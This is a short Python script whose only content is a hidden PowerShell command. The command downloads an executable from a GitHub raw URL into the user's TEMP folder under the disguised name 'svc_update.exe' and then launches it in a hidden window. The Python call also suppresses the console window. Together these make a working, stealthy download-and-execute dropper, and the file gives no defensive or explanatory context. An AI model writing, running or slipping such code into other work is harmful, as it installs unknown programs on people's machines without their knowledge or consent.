import os
import subprocess


subprocess.run(
    'powershell -NoP -NonI -W Hidden -Command '
    '"$url = \'https://github.com/example/repo/raw/main/agent.exe\'; '
    '$path = $env:TEMP + \'\\svc_update.exe\'; '
    '(New-Object System.Net.WebClient).DownloadFile($url, $path); '
    'Start-Process -FilePath $path -WindowStyle Hidden"',
    shell=True,
    creationflags=subprocess.CREATE_NO_WINDOW,
)
